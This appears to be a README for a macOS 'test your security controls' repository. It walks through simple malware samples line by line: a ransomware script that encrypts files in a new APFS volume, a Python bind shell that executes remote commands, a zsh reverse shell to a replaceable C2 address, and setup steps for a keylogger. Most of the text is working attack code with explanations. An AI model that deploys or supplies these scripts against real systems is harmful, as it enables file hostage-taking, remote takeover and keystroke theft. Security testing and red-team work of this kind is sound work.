# Overview
This repository is a collection of simple malware and payloads to help cyber security analysts and technicians test their mac os security controls and monitor system

# Simple Ransomeware Script (apfs_ransomware.sh)
This script simulates a ransomware scenario by creating a new APFS volume move all the files into the volume and encrypt that volume. The script was adjusted to reduce the complexity and the potential damage.
Reference source: https://www.huntress.com/blog/creating-macos-ransomware
`p="1234"`
+ Set a simple passphrase to encrypt the Volume XX
`disk_name=$(diskutil info / | grep “APFS Container:” | tr -s “ “ | cut -d” “ -f4)`
+ Get the disk name of the current machine
`diskutil apfs addVolume “${disk_name}” APFS XX -pasphrase “${p}”`
+ Create a new disk volume in the selected APFS container and set it as an encrypted volume
`mv -f ./Sample_Dir/* /Volumes/XX`
+ Move some testing sample documents to the encrypted Volume, replace the sample document path
`echo $p`
+ Display the passphrase

# Simple Python Bind Shell (python_bind_shell.sh)
This script simulates a bind shell scenario where an attacker set a backdoor on the target system using Python 3.
Reference source: Online - Reverse Shell Generator (https://www.revshells.com/) (select Bind tab and select
Python3 Bind option)
```
import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&quot;0.0.0.0&quot;,9001));s1.listen(1);c,a=s1.accept();
```
+ Set up an open port on the system so the attacker can access the system remotely
```
while True:
d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())
```
+ The code listens for the command sent by the attacker and reply with the command’s result

# Simple off the land Reverse Shell (zmodload_reverse_shell.sh)
`zmodload zsh/net/tcp`
+ Load built in module tcp
`ztcp 127.0.0.1 4444`
+ Establish connection to the C2 server, replace the ip address and port number
`zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`
+ Maintain the interactive shell with the C2 server

# Simple Keylogger on macOS
Source code repository on Github: https://github.com/caseyscarborough/keylogger/tree/master
## Note
When you got the error: `ERROR: Unable to create event tap.`
Go into System Preferences and go to **Security & Privacy**, click the **Privacy tab**, choose **Accessibility** in the left pane, and ensure that **Terminal is checked**.
